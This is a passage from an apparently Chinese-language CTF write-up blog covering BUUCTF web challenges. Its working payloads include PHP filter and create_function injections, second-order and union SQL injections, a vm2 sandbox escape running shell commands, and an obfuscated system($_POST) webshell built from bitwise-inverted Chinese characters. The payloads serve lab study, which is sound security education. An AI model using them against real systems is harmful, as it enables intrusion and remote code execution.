class="number">6</span>f%<span class="number">64</span>%<span class="number">65</span>]=%<span class="number">63</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">5</span>f%<span class="number">66</span>%<span class="number">75</span>%<span class="number">6</span>e%<span class="number">63</span>%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">6</span>e&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>]=;&#125;%<span class="number">76</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">75</span>%<span class="number">6</span>d%<span class="number">70</span>(%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">64</span>%<span class="number">5</span>f%<span class="number">76</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">73</span>());<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688899385264-4f64aa94-f527-4470-9bca-c3ff249a256f.png" alt="img"></p>
<p>可以看到flag在 <code>rea1fl4g.php</code></p>
<p>但是直接访问无结果，所以还得通过伪协议配合文件包含去读</p>
<p> 看别人wp都是说因为禁用了include所以用require，但是我看源码没有禁include并且也用不了？？</p>
<p>然后<code>$code</code>单双引号也不能用</p>
<p>既然我们是get传参的所以我们也不能用数字字母所以我们就用取反利用不可见字符来输入伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</span><br><span class="line">require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))</span><br></pre></td></tr></table></figure>

<p>最后的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67[%61%72%67]=;&#125;%72%65%71%75%69%72%65(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure>

<p>post传入：<code>debu=1&amp;file=1</code></p>
<p>还有一种解法是用require()去包含我们的flag文件 rea1fl4g.php  </p>
<p>然后再用 <code>var_dump(get_defined_vars()</code>去读</p>
<p>但是这里我们的<code>.</code>被禁了 所以利用base64函数 进行bypass</p>
<p>最终的paylaod：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&amp;debu=aqua_is_cute &amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//  </span><br></pre></td></tr></table></figure>

<p>post: <code>file=1&amp;debu=2  </code></p>
<p>当然要url编码打入</p>
<h1 id="99、October-2019-Twice-SQL-Injectio"><a href="#99、October-2019-Twice-SQL-Injectio" class="headerlink" title="99、October 2019 Twice SQL Injectio"></a>99、October 2019 Twice SQL Injectio</h1><p>一道根据二次注入的题目</p>
<p>看题目标题也知道 然后我注册了admin’ 发现他登录后显示的语句不正常输出了 怀疑就是登录名存在二次注入</p>
<p> 然后注册<code>admin&#39; union select database()#</code>发现爆出了库名</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688901679744-d25e859e-d14a-49fc-949b-1f84172e40c4.png" alt="img"></p>
<p>然后就是联合注入和二次注入组合拳就行了 比较简单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; union select database() #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">admin&#x27;</span> union select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;ctftraining&#x27;</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">admin&#x27;</span> union select flag <span class="keyword">from</span> flag <span class="comment">#</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h1 id="100、-HFCTF2020-JustEscape"><a href="#100、-HFCTF2020-JustEscape" class="headerlink" title="100、[HFCTF2020]JustEscape"></a>100、[HFCTF2020]JustEscape</h1><p>一道没有思路的学习题目 vm的沙箱逃逸</p>
<p>看了网上的WP 好多都是没有分析只给了payload </p>
<p>大概学习了一下<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859#toc-3">https://xz.aliyun.com/t/11859#toc-3</a></p>
<p>首先就是要通过奇怪的构造方式获取到全局process对象，这个全局对象下我们可以执行导入child_process，然后<code>require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</code>进行命令执行了</p>
<p>看wp都是利用自执行函数 就是形如<code>(function()&#123;&#125;) 或 (function()&#123;&#125;)() </code>的表达式 ，被定义之后就会立即执行  </p>
<p>过滤了<code>[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</code></p>
<p>然后poc都是在这里淘宝：<a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues">https://github.com/patriksimek/vm2/issues</a></p>
<p>通过模板字符串来bypass被waf的字符 其实本质就是格式化字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">console.<span class="title function_ invoke__">log</span>(`$&#123;`$&#123;`prototyp`&#125;e`&#125;`)</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(`$&#123;`prototype`&#125;`)</span><br><span class="line"></span><br><span class="line">等于prototype</span><br></pre></td></tr></table></figure>

<p>反引号来绕过单双引号</p>
<p>payload1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = f=&gt;f.<span class="title function_ invoke__">constructor</span>(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.<span class="title function_ invoke__">preventExtensions</span>(Buffer.<span class="keyword">from</span>(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_ invoke__">get_process</span>(()=&gt;&#123;&#125;).mainModule.<span class="keyword">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_ invoke__">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>因为有waf所以要利用数组</p>
<p>看大佬wp</p>
<p><strong>当对象的方法或者属性名关键字被过滤的情况下可以利用数组调用的方式绕过关键字的限制</strong>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?code[]=(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = f=&gt;f.<span class="title function_ invoke__">constructor</span>(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.<span class="title function_ invoke__">preventExtensions</span>(Buffer.<span class="keyword">from</span>(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_ invoke__">get_process</span>(()=&gt;&#123;&#125;).mainModule.<span class="keyword">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_ invoke__">execSync</span>(<span class="string">&quot;ls&quot;</span>).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>payload2就是利用模板字符串去bypass被waf的字符</p>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="keyword">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">untrusted</span> = <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[`$&#123;`prototyp`&#125;e`][`$&#123;`get_proces`&#125;s`] = f=&gt;f[`$&#123;`constructo`&#125;r`](`<span class="keyword">return</span> this.$&#123;`proces`&#125;s`)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.<span class="title function_ invoke__">preventExtensions</span>(Buffer.<span class="keyword">from</span>(``)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[`$&#123;`get_proces`&#125;s`](()=&gt;&#123;&#125;).mainModule[`$&#123;`requir`&#125;e`](`$&#123;`child_proces`&#125;s`)[`$&#123;`exe`&#125;cSync`](`whoami`).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(untrusted)</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(<span class="keyword">new</span> <span class="title function_ invoke__">VM</span>().<span class="title function_ invoke__">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?code=(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[`$&#123;`prototyp`&#125;e`][`$&#123;`get_proces`&#125;s`] = f=&gt;f[`$&#123;`constructo`&#125;r`](`<span class="keyword">return</span> this.$&#123;`proces`&#125;s`)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.<span class="title function_ invoke__">preventExtensions</span>(Buffer.<span class="keyword">from</span>(``)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[`$&#123;`get_proces`&#125;s`](()=&gt;&#123;&#125;).mainModule[`$&#123;`requir`&#125;e`](`$&#123;`child_proces`&#125;s`)[`$&#123;`exe`&#125;cSync`](`ls`).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>就暂时这样吧，做的云里雾里的。</p>
<h1 id="101、-GXYCTF2019-StrongestMind"><a href="#101、-GXYCTF2019-StrongestMind" class="headerlink" title="101、[GXYCTF2019]StrongestMind"></a>101、[GXYCTF2019]StrongestMind</h1><p>纯是考察python脚本</p>
<p>写个脚本爬下要求两个数字，计算，然后再post提交两个数字的结果，重复1000次。</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966691744-0ff8bc5e-3bdc-4fe4-9f4b-60e708c4cffd.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests import *</span><br><span class="line">import re</span><br><span class="line">s = <span class="title function_ invoke__">session</span>()</span><br><span class="line">a = s.<span class="title function_ invoke__">get</span>(<span class="string">&quot;http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php&quot;</span>)</span><br><span class="line">pattern = re.<span class="title function_ invoke__">findall</span>(r<span class="string">&#x27;\d+.[+-].\d+&#x27;</span>, a.text) </span><br><span class="line">c = <span class="keyword">eval</span>(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.<span class="title function_ invoke__">post</span>(<span class="string">&quot;http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php&quot;</span>, data = &#123;<span class="string">&quot;answer&quot;</span> : c&#125;)</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1000</span>):</span><br><span class="line">	pattern = re.<span class="title function_ invoke__">findall</span>(r<span class="string">&#x27;\d+.[+-].\d+&#x27;</span>, a.text) </span><br><span class="line">	c = <span class="keyword">eval</span>(pattern[<span class="number">0</span>])</span><br><span class="line">  <span class="comment">//这里pattern=形如[&#x27;36328928 + 88301757&#x27;]是个list 那么可以用下标为0提出来36328928 + 88301757</span></span><br><span class="line">	<span class="keyword">print</span>(c)</span><br><span class="line">	a = s.<span class="title function_ invoke__">post</span>(<span class="string">&quot;http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php&quot;</span>, data = &#123;<span class="string">&quot;answer&quot;</span> : c&#125;)</span><br><span class="line"><span class="keyword">print</span>(a.text)</span><br></pre></td></tr></table></figure>

<p>重要的点就是 我们要记录1000次数 所以要保存上一次的状态，要保存一下session</p>
<p>请求的时候 session().get 或者 session().post 可以保持我们的会话状态session  并且发送不同的请求</p>
<p>又学到了！！</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966946619-d0ce7ed6-e9a6-4c4d-96e9-5c89b18aed89.png" alt="img"></p>
<h1 id="102、-SUCTF-2018-GetShell"><a href="#102、-SUCTF-2018-GetShell" class="headerlink" title="102、[SUCTF 2018]GetShell"></a>102、[SUCTF 2018]GetShell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>先文件包含将我们的文件内容读入然后检查第六位开始的内容 </p>
<p>fuzz一下 看看哪些字符没有被waf</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972164206-c84c4d71-7af7-405f-ab58-7a01382d8a3d.png" alt="img"></p>
<p><code>$()_[]~;.=</code>这些没有被waf 还有汉字 这道题目就是利用汉字按位取反来getshell的</p>
<p>这里有个很重要的一点 在爆破时候一定要把urlencode关了，不然提交的时候bp会将特殊的符号url编码从而使得fuzz出错 我第一次就是因为这个fuzz不全</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972249693-0b95cade-1ab0-4116-a842-d40fec4f9ff3.png" alt="img"></p>
<p>先得到1和0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$_</span>=[];             <span class="comment">//array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;         <span class="comment">//arrayarray </span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);      <span class="comment">//不成立 false --&gt;0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);      <span class="comment">//成立   true  --&gt;1</span></span><br></pre></td></tr></table></figure>

<p>在PHP中两个空数组相互比较为true 所以值为1</p>
<p>那么该怎么得到字母呢 我们用汉字按位取反然后利用下标去截取我们需要的字符 这里最好选择的汉字去取反后能用的字符下标为0或者1  因为我们前面只构造出了01</p>
<p>可以参考p神的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973469139-4b68991a-fe08-469e-b040-80f76f3dbe3c.png" alt="img"></p>
<p>这样我们就可以截取一个php的p 当然这道题目我们没必要构造出php 用短标签就行了</p>
<p>所以最后payload可以构造很多方式  </p>
<p>偷的：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46263951/article/details/118816182">https://blog.csdn.net/qq_46263951/article/details/118816182</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>                <span class="comment">//PHP中的另外一个短标签&lt;?=，代替&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];             <span class="comment">//array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;         <span class="comment">//arrayarray </span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);      <span class="comment">//不成立 false --&gt;0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);      <span class="comment">//成立   true  --&gt;1</span></span><br><span class="line"><span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>];  <span class="comment">//system</span></span><br><span class="line"><span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>];         <span class="comment">//_Post</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$$____</span>[~瞎[<span class="variable">$__</span>]]);   <span class="comment">//system($_POST[a]);</span></span><br></pre></td></tr></table></figure>

<p>打入 rce即可</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973625307-c62c6cd1-194d-4b26-b8f8-ae282d9cc448.png" alt="img"></p>
<h1 id="103、-GKCTF-2021-easycms"><a href="#103、-GKCTF-2021-easycms" class="headerlink" title="103、[GKCTF 2021]easycms"></a>103、[GKCTF 2021]easycms</h1><p>看标题就知道是找后台 /admin</p>
<p>但是这道题目是admin.php 然后登录 考察弱口令 admin/12345就可以登录</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981688423-219797d3-2ce2-4788-a4df-421375f019df.png" alt="img"></p>
<p>可以看到是蝉知7.7的版本 那就直接检索这个版本的漏洞</p>
<p>但是这道题目buu靶场问题payload稍稍不同 导致花了好长时间一直卡在这</p>
<p>现在这里上传一个txt文件</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981793987-aa46eb16-b193-4fe8-932f-6cf3d7f8b04b.png" alt="img"></p>
<p>然后改名为：<code>../../../../../../../../../../../var/www/html/system/tmp/yzpc</code> </p>
<p>注意这里的最后的yzpc每个人不一样 我们进入后台之后进入设计-高级直接点保存会爆出一个路径 里面每个人不一样</p>
<p>就是这个路径和网上许多师傅复现的路径不一样 应该是靶场问题</p>
<p>好多师傅都是修改为：<code>../../../../../system/tmp/yzpc</code></p>
<p>但是这道题目要按我这种路径</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981807209-791e4185-75c6-437e-8e08-04ae2b6fe628.png" alt="img"></p>
<p>之后写入恶意代码即可</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981987225-574481c1-124f-4461-95da-7c07b5565c7e.png" alt="img"></p>
<p>还有一种就是我们上传完文件修改文件名以后在主题编辑里 编辑网站头部 直接写入php🐎即可</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982259213-467c161b-a461-43d4-907c-dc982a85a45a.png" alt="img"></p>
<p>可以看到执行成功</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982237616-df436f24-2567-4a63-83df-8ee981b28a72.png" alt="img"></p>
<h1 id="104、-b01lers2020-Life-on-Mars"><a href="#104、-b01lers2020-Life-on-Mars" class="headerlink" title="104、[b01lers2020]Life on Mars"></a>104、[b01lers2020]Life on Mars</h1><p>这道题难点还是在于怎么找到sql注入点 考察的只是联合注入 </p>
<p>进入网页 抓包分析 会发现有请求</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042712077-67edce38-b96a-444a-bce5-62b0f91350dc.png" alt="img"></p>
<p>注入点如图</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042755534-7ce030d7-56c5-4055-8095-8ec62023fbb5.png" alt="img"></p>
<p>构造<code>/query?search=amazonis_planitia%20union%20select%201,2 </code>发现有回显 有两列</p>
<p>然后就是联合注入常规操作</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">database</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当前库：aliens</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">group_concat</span>(table_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&#x27;aliens&#x27;</span></span><br><span class="line"></span><br><span class="line">表：amazonis_planitia,arabia_terra,chryse_planitia,hellas_basin,hesperia_planum,noachis_terra,olympus_mons,tharsis_rise,utopia_basin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">group_concat</span>(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_name=<span class="string">&#x27;olympus_mons&#x27;</span></span><br></pre></td></tr></table></figure>

<p>注到这里 发现有很多表而且都没有flag</p>
<p>因此感觉flag不在当前库里 </p>
<p>再查一下所有库吧 原来在alien_code这个库里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>group_concat(SCHEMA_NAME)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.SCHEMATA</span><br><span class="line">所有库：information_schema,alien_code,aliens</span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">group_concat</span>(table_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&#x27;alien_code&#x27;</span></span><br><span class="line"></span><br><span class="line">表：code</span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">group_concat</span>(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_name=<span class="string">&#x27;code</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">列：id,code</span><br><span class="line"></span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,code%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>alien_code.code</span><br><span class="line">这里要指定一下库 不然注不出来</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h1 id="105、-MRCTF2020-Ezaudit"><a href="#105、-MRCTF2020-Ezaudit" class="headerlink" title="105、[MRCTF2020]Ezaudit"></a>105、[MRCTF2020]Ezaudit</h1><p>之前就在buu上做过这类似的</p>
<p>首先进网页是一个花里胡哨的略过，然后扫后台发现源码泄露<code>/www.zip</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 